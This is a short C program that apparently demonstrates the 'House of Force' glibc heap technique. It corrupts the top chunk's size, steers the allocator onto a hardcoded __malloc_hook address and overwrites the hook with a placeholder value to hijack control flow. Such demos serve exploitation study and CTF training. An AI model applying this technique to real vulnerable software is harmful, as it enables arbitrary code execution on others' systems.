#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#define __malloc_hook 0x7ffff7dd1b10

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){	
	long long size = 0;
	long long p_addr = 0;
	long long *p,*q;
	init();
	// init a chunk
	p = malloc(0x18);
	p[3] = -1; // set top chunk's size to -1
	sleep(0);
	p_addr = p;
	size = __malloc_hook - (p_addr + 0x20) - 0x10;
	// malloc to set top_chunk_addr to target
	malloc(size);
	sleep(0);
	q = malloc(0x18);
	// set __malloc_hook's value = 0xdeadbeefdeadbeef
	q[0] = 0xdeadbeefdeadbeef;
	sleep(0);
	// malloc to trigger 0xdeadbeefdeadbeef
	malloc(0);
}

